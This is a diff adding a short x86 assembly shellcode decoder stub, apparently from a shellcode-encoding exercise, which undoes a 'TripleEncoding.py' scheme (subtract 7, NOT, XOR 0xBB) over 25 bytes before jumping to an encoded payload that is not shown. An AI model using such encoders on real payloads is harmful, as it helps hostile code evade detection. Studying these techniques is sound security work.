@@ -1,0 +1,27 @@
+global _start			
+
+section .text
+_start:
+	jmp short call_shellcode
+
+decoder:
+	pop esi			
+	xor ecx, ecx
+	mov cl, 25
+
+
+decode:
+	; reverse order than TripleEncoding.py
+
+	sub byte [esi],0x07	; substracting 7
+	not byte [esi]		; complementing
+	xor byte [esi],0xBB	; XOR with 0xBB
+
+	inc esi
+	loop decode
+
+	jmp short EncodedShellcode
+
+call_shellcode:
+
+	call decoder
